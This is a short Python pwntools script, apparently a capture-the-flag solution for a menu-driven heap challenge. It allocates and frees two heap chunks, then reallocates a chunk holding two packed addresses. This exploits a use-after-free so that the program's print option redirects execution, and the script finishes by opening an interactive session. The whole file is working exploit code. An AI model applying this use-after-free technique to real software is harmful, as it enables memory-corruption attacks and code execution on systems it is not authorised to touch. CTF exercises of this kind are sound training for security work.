from parse_args_and_some_func import *

sh:tube = all_parsed_args['io']

def create_heap(size:int, content:(str, bytes)):
    sh.sendlineafter("Your choice: ", "1")
    sh.sendlineafter("Please input size: \n", str(size))
    sh.sendafter("Please input content: \n", content)


def delete_heap(idx:int):
    sh.sendlineafter("Your choice: ", "2")
    sh.sendlineafter("Please input list index: \n", str(idx))

def print_heap(idx:int):
    sh.sendlineafter("Your choice: ", "3")
    sh.sendlineafter("Please input list index: \n", str(idx))
    return sh.recvline()

create_heap(0x10, 'aaaa')
create_heap(0x30, 'bbbb')

delete_heap(0)
delete_heap(1)

create_heap(0x10, p64(0x602010) + p64(0x4007a0))

sh.sendlineafter("Your choice: ", "3")
sh.sendlineafter("Please input list index: \n", str(0))
sh.interactive()